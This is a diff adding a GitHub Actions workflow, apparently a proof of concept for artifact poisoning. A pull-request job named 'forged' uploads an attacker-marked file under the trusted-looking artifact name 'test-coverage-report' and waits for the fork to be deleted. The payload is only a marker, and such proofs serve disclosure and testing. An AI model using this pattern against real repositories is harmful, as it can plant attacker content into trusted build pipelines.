@@ -1,0 +1,19 @@
+name: Verify
+on:
+  pull_request:
+
+jobs:
+  forged:
+    runs-on: ubuntu-latest
+    steps:
+      - name: make marker and artifact
+        run: |
+          echo "ATTACKER-MARKER-12345" > marker.txt
+          cat marker.txt
+      - name: upload
+        uses: actions/upload-artifact@main
+        with:
+          name: test-coverage-report
+          path: marker.txt
+      - name: keep run alive for fork deletion
+        run: sleep 150
